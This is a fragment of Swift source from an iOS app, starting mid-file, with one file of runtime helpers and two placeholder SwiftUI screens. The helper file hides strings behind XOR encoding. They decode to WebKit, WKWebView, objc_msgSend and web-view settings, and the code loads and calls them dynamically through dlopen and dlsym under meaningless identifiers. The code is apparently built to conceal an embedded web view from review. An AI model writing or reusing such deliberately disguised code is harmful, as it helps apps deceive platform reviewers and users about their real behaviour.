                state.dixewQenor = state.negawobYinem.last
            }
        }
    }
}


// SedeMerun.swift

import Foundation
import UIKit
import ObjectiveC.runtime

// MARK: - WebKit строки (XOR)
var qidifitay: String {
    let k: UInt8 = 0x4e
    let d: [UInt8] = [0x61, 0x1d, 0x37, 0x3d, 0x3a, 0x2b, 0x23, 0x61, 0x02, 0x27, 0x2c, 0x3c, 0x2f, 0x3c, 0x37, 0x61, 0x08, 0x3c, 0x2f, 0x23, 0x2b, 0x39, 0x21, 0x3c, 0x25, 0x3d, 0x61, 0x19, 0x2b, 0x2c, 0x05, 0x27, 0x3a, 0x60, 0x28, 0x3c, 0x2f, 0x23, 0x2b, 0x39, 0x21, 0x3c, 0x25, 0x61, 0x19, 0x2b, 0x2c, 0x05, 0x27, 0x3a]
    return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
}
var kitanucegu: String {
    let k: UInt8 = 0xc7
    let d: [UInt8] = [0x90, 0x8c, 0x90, 0xa2, 0xa5, 0x91, 0xae, 0xa2, 0xb0]
    return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
}
var seyane: String {
    let k: UInt8 = 0x4e
    let d: [UInt8] = [0x19, 0x05, 0x1e, 0x3c, 0x2b, 0x28, 0x2b, 0x3c, 0x2b, 0x20, 0x2d, 0x2b, 0x3d]
    return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
}
var zekocohokof: String {
    let k: UInt8 = 0x5d
    let d: [UInt8] = [0x0a, 0x16, 0x0a, 0x38, 0x3f, 0x0b, 0x34, 0x38, 0x2a, 0x1e, 0x32, 0x33, 0x3b, 0x34, 0x3a, 0x28, 0x2f, 0x3c, 0x29, 0x34, 0x32, 0x33]
    return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
}
var kowasehanog: String {
    let k: UInt8 = 0x38
    let d: [UInt8] = [0x6f, 0x73, 0x6f, 0x5d, 0x5a, 0x48, 0x59, 0x5f, 0x5d, 0x68, 0x4a, 0x5d, 0x5e, 0x5d, 0x4a, 0x5d, 0x56, 0x5b, 0x5d, 0x4b]
    return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
}
var cilepufepe: String {
    let k: UInt8 = 0xd3
    let d: [UInt8] = [0xb9, 0xb2, 0xa5, 0xb2, 0x80, 0xb0, 0xa1, 0xba, 0xa3, 0xa7, 0x90, 0xb2, 0xbd, 0x9c, 0xa3, 0xb6, 0xbd, 0x84, 0xba, 0xbd, 0xb7, 0xbc, 0xa4, 0xa0, 0x92, 0xa6, 0xa7, 0xbc, 0xbe, 0xb2, 0xa7, 0xba, 0xb0, 0xb2, 0xbf, 0xbf, 0xaa]
    return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
}
var yipeyuqen: String {
    let k: UInt8 = 0xbc
    let d: [UInt8] = [0xcc, 0xce, 0xd9, 0xda, 0xd9, 0xce, 0xd9, 0xd2, 0xdf, 0xd9, 0xcf]
    return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
}
var johufiqesawe: String {
    let k: UInt8 = 0xb7
    let d: [UInt8] = [0xd3, 0xd2, 0xd1, 0xd6, 0xc2, 0xdb, 0xc3, 0xe0, 0xd2, 0xd5, 0xc7, 0xd6, 0xd0, 0xd2, 0xe7, 0xc5, 0xd2, 0xd1, 0xd2, 0xc5, 0xd2, 0xd9, 0xd4, 0xd2, 0xc4]
    return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
}
var zuvica: String {
    let k: UInt8 = 0xd0
    let d: [UInt8] = [0xb1, 0xbc, 0xbc, 0xbf, 0xa7, 0xa3, 0x93, 0xbf, 0xbe, 0xa4, 0xb5, 0xbe, 0xa4, 0x9a, 0xb1, 0xa6, 0xb1, 0x83, 0xb3, 0xa2, 0xb9, 0xa0, 0xa4]
    return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
}
var xagerefupec: String {
    let k: UInt8 = 0x8f
    let d: [UInt8] = [0xee, 0xe3, 0xe3, 0xe0, 0xf8, 0xfc, 0xc6, 0xe1, 0xe3, 0xe6, 0xe1, 0xea, 0xc2, 0xea, 0xeb, 0xe6, 0xee, 0xdf, 0xe3, 0xee, 0xf6, 0xed, 0xee, 0xec, 0xe4]
    return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
}
var kopogivaf: String {
    let k: UInt8 = 0x4a
    let d: [UInt8] = [0x2b, 0x3a, 0x3a, 0x26, 0x23, 0x29, 0x2b, 0x3e, 0x23, 0x25, 0x24, 0x04, 0x2b, 0x27, 0x2f, 0x0c, 0x25, 0x38, 0x1f, 0x39, 0x2f, 0x38, 0x0b, 0x2d, 0x2f, 0x24, 0x3e]
    return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
}
var fomucetar: String {
    let k: UInt8 = 0xe4
    let d: [UInt8] = [0x8a, 0x85, 0x92, 0x8d, 0x83, 0x85, 0x90, 0x8d, 0x8b, 0x8a, 0xa0, 0x81, 0x88, 0x81, 0x83, 0x85, 0x90, 0x81]
    return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
}
var megilumanaq: String {
    let k: UInt8 = 0x4c
    let d: [UInt8] = [0x19, 0x05, 0x08, 0x29, 0x20, 0x29, 0x2b, 0x2d, 0x38, 0x29]
    return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
}
var ragohogatudob: String {
    let k: UInt8 = 0x8a
    let d: [UInt8] = [0xf9, 0xe9, 0xf8, 0xe5, 0xe6, 0xe6, 0xdc, 0xe3, 0xef, 0xfd]
    return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
}
var reliwerimayeca: String {
    let k: UInt8 = 0x1e
    let d: [UInt8] = [0x6a, 0x76, 0x7b, 0x73, 0x7b, 0x5d, 0x71, 0x72, 0x71, 0x6c]
    return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
}
var cotavaposeqerod: String {
    let k: UInt8 = 0x51
    let d: [UInt8] = [0x04, 0x03, 0x1d]
    return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
}
var qobidi: String {
    let k: UInt8 = 0x38
    let d: [UInt8] = [0x5b, 0x57, 0x56, 0x5e, 0x51, 0x5f, 0x4d, 0x4a, 0x59, 0x4c, 0x51, 0x57, 0x56]
    return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
}
var duwubaboba: String {
    let k: UInt8 = 0x52
    let d: [UInt8] = [0x31, 0x33, 0x3c, 0x15, 0x3d, 0x10, 0x33, 0x31, 0x39]
    return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
}
var kufoqaqocipuxuc: String {
    let k: UInt8 = 0xa6
    let d: [UInt8] = [0xc7, 0xca, 0xca, 0xc9, 0xd1, 0xd5, 0xe4, 0xc7, 0xc5, 0xcd, 0xe0, 0xc9, 0xd4, 0xd1, 0xc7, 0xd4, 0xc2, 0xe8, 0xc7, 0xd0, 0xcf, 0xc1, 0xc7, 0xd2, 0xcf, 0xc9, 0xc8, 0xe1, 0xc3, 0xd5, 0xd2, 0xd3, 0xd4, 0xc3, 0xd5]
    return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
}
var fipucuwohumivaq: String {
    let k: UInt8 = 0xc2
    let d: [UInt8] = [0xaf, 0xa7, 0xa6, 0xab, 0xa3, 0x96, 0xbb, 0xb2, 0xa7, 0xb1, 0x90, 0xa7, 0xb3, 0xb7, 0xab, 0xb0, 0xab, 0xac, 0xa5, 0x97, 0xb1, 0xa7, 0xb0, 0x83, 0xa1, 0xb6, 0xab, 0xad, 0xac, 0x84, 0xad, 0xb0, 0x92, 0xae, 0xa3, 0xbb, 0xa0, 0xa3, 0xa1, 0xa9]
    return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
}
var puhuvuyuxawusex: String {
    let k: UInt8 = 0xd4
    let d: [UInt8] = [0xb5, 0xb8, 0xb8, 0xbb, 0xa3, 0xa7, 0x95, 0xbd, 0xa6, 0x84, 0xb8, 0xb5, 0xad, 0x92, 0xbb, 0xa6, 0x99, 0xb1, 0xb0, 0xbd, 0xb5, 0x84, 0xb8, 0xb5, 0xad, 0xb6, 0xb5, 0xb7, 0xbf]
    return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
}
var xedavukevuke: String {
    let k: UInt8 = 0xa2
    let d: [UInt8] = [0xc3, 0xce, 0xce, 0xcd, 0xc1]
    return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
}
var pesobugucumuseq: String {
    let k: UInt8 = 0x92
    let d: [UInt8] = [0xfb, 0xfc, 0xfb, 0xe6]
    return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
}
var faqubabocivev: String {
    let k: UInt8 = 0xd5
    let d: [UInt8] = [0xbc, 0xbb, 0xbc, 0xa1, 0x82, 0xbc, 0xa1, 0xbd, 0x93, 0xa7, 0xb4, 0xb8, 0xb0, 0xef, 0xb6, 0xba, 0xbb, 0xb3, 0xbc, 0xb2, 0xa0, 0xa7, 0xb4, 0xa1, 0xbc, 0xba, 0xbb, 0xef]
    return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
}
var qilizupaxe: String {
    let k: UInt8 = 0x37
    let d: [UInt8] = [0x5b, 0x58, 0x56, 0x53, 0x65, 0x52, 0x46, 0x42, 0x52, 0x44, 0x43, 0x0d]
    return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
}
var nititi: String {
    let k: UInt8 = 0xba
    let d: [UInt8] = [0xdd, 0xd5, 0xf8, 0xdb, 0xd9, 0xd1]
    return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
}
var quludotek: String {
    let k: UInt8 = 0xc8
    let d: [UInt8] = [0xa7, 0xaa, 0xa2, 0xab, 0x97, 0xa5, 0xbb, 0xaf, 0x9b, 0xad, 0xa6, 0xac]
    return String(bytes: d.map { $0 ^ k }, encoding: .utf8) ?? ""
}

// MARK: - Runtime helpers (internal — доступны из всех файлов модуля)
func zuzoxuTetak() {
    if NSClassFromString(kitanucegu) == nil {
        dlopen(qidifitay, RTLD_NOW)
    }
}

let lavubuPowam: UnsafeMutableRawPointer = {
    guard let h = dlopen(nil, RTLD_NOW), let p = dlsym(h, quludotek) else {
        fatalError("dlsym failed")
    }
    return p
}()

func doxibuxanGazis(_ o: AnyObject, _ s: Selector) -> AnyObject {
    unsafeBitCast(lavubuPowam, to: (@convention(c) (AnyObject, Selector) -> AnyObject).self)(o, s)
}
func vexizawiWuq(_ o: AnyObject, _ s: Selector, _ r: CGRect, _ a: AnyObject) -> AnyObject {
    unsafeBitCast(lavubuPowam, to: (@convention(c) (AnyObject, Selector, CGRect, AnyObject) -> AnyObject).self)(o, s, r, a)
}
func pegoxarKid(_ n: String) -> Selector { NSSelectorFromString(n) }
func zugediJizu(_ n: String) -> AnyObject { NSClassFromString(n)! as AnyObject }
func kitazoWis(_ n: String) -> NSObject {
    doxibuxanGazis(doxibuxanGazis(zugediJizu(n), pegoxarKid(xedavukevuke)), pegoxarKid(pesobugucumuseq)) as! NSObject
}



// FebaxoPage.swift

import SwiftUI

struct FebaxoPage: View {
    var body: some View {
        ZStack {
            Color.pink
                .ignoresSafeArea()

            VStack(spacing: 20) {
                ProgressView()
                    .frame(width: 200, height: 200)
                    .controlSize(.large)
                    .tint(.white)

                Text("Loading...")
                    .foregroundColor(.white)
                    .font(.headline)
            }
        }
    }
}


// JeviQaxa.swift

import SwiftUI

struct JeviQaxa: View {
    var body: some View {
        Color.blue
    }
}
